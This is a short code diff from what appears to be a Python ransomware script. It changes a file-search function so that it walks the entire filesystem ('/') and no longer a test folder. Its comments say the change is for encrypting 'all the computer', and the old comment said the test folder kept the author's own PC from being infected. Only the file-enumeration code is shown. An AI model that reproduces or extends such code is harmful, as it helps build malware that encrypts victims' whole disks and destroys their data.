@@ -52,8 +52,8 @@ EXTENSIONS = (
 def search_files():
     f = open("logs/path.txt", "w")
     cnt = 0
-    # for root, dirs, files in os.walk("/"):
-    for root, dirs, files in os.walk("test_file/"): # Répertoire de test (c'est mieux pour pas infecter son pc quand meme)
+    for root, dirs, files in os.walk("/"): # If you want encrypt all the commputer
+    # for root, dirs, files in os.walk("test_file/"): # for test | it's a security
         if any(s in root for s in EXCLUDE_DIRECTORY):
             pass
         else:
